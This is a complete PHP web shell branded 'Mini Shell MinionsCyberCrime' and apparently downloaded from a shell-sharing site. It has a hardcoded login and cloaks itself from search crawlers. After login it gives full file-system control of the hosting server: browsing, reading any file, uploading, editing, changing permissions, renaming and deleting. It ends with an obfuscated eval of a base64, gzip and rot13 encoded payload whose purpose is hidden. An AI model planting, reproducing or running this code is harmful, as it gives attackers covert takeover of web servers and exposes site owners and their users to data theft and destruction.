<!-- Downloaded From: https://shell.prinsh.com -->

<?php

/*------------------ LOGIN -------------------*/

$username="woah";
$password="peler";
$email="";

/*------------------ Login Data End ----------*/

@error_reporting(4);

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />"; //For Ensuring... Fuck all Robots...
/*------------------ End of Anti Crawler -----*/



    echo "<link href=data:image/gif;https://k.top4top.io/p_2247ijfjq0.jpg rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url(https://l.top4top.io/p_2248cfwwm9.jpg) black; }
    #loginbox { font-size:11px; color:green; width:1200px; height:200px; border:1px solid #4C83AF; background-color:#111111; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
    input { font-size:11px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; }
    loginbox td { border-radius:5px; font-size:11px; }
    .header { size:25px; color:green; }
    h1 { font-family:DigifaceWide; color:green; font-size:200%; }
    h1:hover { text-shadow:0 0 20px #00FFFF, 0 0 100px #00FFFF; }
    .go { height: 50px; width: 50px;float: left; margin-right: 10px; display: none; background-color: #090;}
    .input_big { width:75px; height:30px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; font-size:17px; }
    hr { border:1px solid #222222; }
    #meunlist { width: auto; height: auto; font-size: 12px; font-weight: bold; }
    #meunlist ul { padding-top: 5px; padding-right: 5px; padding-bottom: 7px; padding-left: 2px; text-align:center; list-style-type: none; margin: 0px; }
    #meunlist li { margin: 0px; padding: 0px; display: inline; }
    #meunlist a { font-size: 14px; text-decoration:none; font-weight: bold;color:green;clear: both;width: 100px;margin-right: -6px; padding-top: 3px; padding-right: 15px; padding-bottom: 3px; padding-left: 15px; }
    #meunlist a:hover { background: #333; color:green; }
    .menubar {-moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0;  }
    .menu { font-size:25px; color: }
    .textarea_edit { background-color:#111111; border:1px groove #333; color:green; }
    .textarea_edit:hover { text-decoration:none; border:1px dashed #333; }
    .input_butt {font-size:11px; background:#191919; color:#4C83AF; margin:0 4px; border:1px solid #222222;}
    #result{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px;}
    .table{ width:100%; padding:4px 0; color:#888; font-size:15px; }
    .table a{ text-decoration:none; color:green; font-size:15px; }
    .table a:hover{text-decoration:underline;}
    .table td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top; }
    .table th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; }
    .table tr:hover{ background:#181818; }
    .tbl{ width:100%; padding:4px 0; color:#888; font-size:15px; text-align:center;  }
    .tbl a{ text-decoration:none; color:green; font-size:15px; vertical-align:middle; }
    .tbl a:hover{text-decoration:underline;}
    .tbl td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px;  vertical-align:middle; width: 300px; }
    .tbl th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; vertical-align:middle; }
    .tbl td:hover{ background:#181818; }
    #alert {position: relative;}
    #alert:hover:after {background: hsla(0,0%,0%,.8);border-radius: 3px;color: #f6f6f6;content: 'Click to dismiss';font: bold 12px/30px sans-serif;height: 30px;left: 50%;margin-left: -60px;position: absolute;text-align: center;top: 50px; width: 120px;}
    #alert:hover:before {border-bottom: 10px solid hsla(0,0%,0%,.8);border-left: 10px solid transparent;border-right: 10px solid transparent;content: '';height: 0;left: 50%;margin-left: -10px;position: absolute;top: 40px;width: 0;}
    #alert:target {display: none;}
    .alert_red {animation: alert 1s ease forwards;background-color: #c4453c;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
    .alert_green {animation: alert 1s ease forwards;background-color: #43CD80;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
    @keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
    </style>";
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        if($_POST["usrname"]==$username && $_POST["passwrd"]==$password)
        {
            print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
            if($email!="")
            {
                mail_alert();
            }
        }
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("UserName/PassWord Salah pler:(");</script>';
            }
            echo '<title>Mini Shell MinionsCyberCrime</title><center>
            <div id=loginbox><p><font face="verdana,arial" size=-1>
            <font color=orange>>>>>>>>>>></font><font color=white>>>>>><<<<<</font><font color=green>>>>>>>>>>></font>
            <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>Mini Shell By MinionsCyberCrime</b></font></th></tr>
            <tr><td bgcolor="black" style="padding:5">
            <form method="post">
            <input type="hidden" name="action" value="login">
            <input type="hidden" name="hide" value="">
            <center><table>
            <tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" value="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
            <tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="passwrd" value="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
            <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Enter"></font></td></tr></table>
            </div><br /></center>';
            exit;
        }
    }

 @set_time_limit(0);
 if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);
 } }
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>Mini Shell MinionsCyberCrime</title>
<style>
body{
font-family: "Iceberg";
background-color: black;
color:red;
}
#content tr:hover{
background-color: #191919;
text-shadow:0px 0px 10px #fff;
}

#content .first{
background-color: #191919;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
<style type="text/css">@import url("https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale")
</style>
</head>
<body>
<link href="https://fonts.googleapis.com/css?family=Lacquer|&display=swap" rel="stylesheet">
<center><img src="https://f.top4top.io/p_22462quep0.jpg" width="100%" height="450"></center>
<h1><center><b><font color="red" face="iceberg">-=[ MINI SHELL </font><font color="white" face="iceberg"></font> <font color="white" face="iceberg">MinionsCyberCrime ]=-</font></b><br>
			</center></h1>
			<font face="iceberg">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="lime">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload File Success!</font><br />';
}else{
echo '<font color="red">Failed for Upload File!</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lime">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Success~!</font><br />';
}else{
echo '<font color="red">Failed for Change Permission !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Change Name Success!</font><br />';
}else{
echo '<font color="red">Failed for Change Name !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Edit File Success!</font><br />';
}else{
echo '<font color="red">Failed for Edit File!</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Delete Dir Success!</font><br />';
}else{
echo '<font color="red">Failed for Delete Dir!</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">Delete File Success!</font><br />';
}else{
echo '<font color="red">Failed for Edit File!</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="lime">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="lime">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center><font color="white"></font><font color="red">MinionsCyberCrime</font></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
?>

<!-- Downloaded From: https://shell.prinsh.com -->
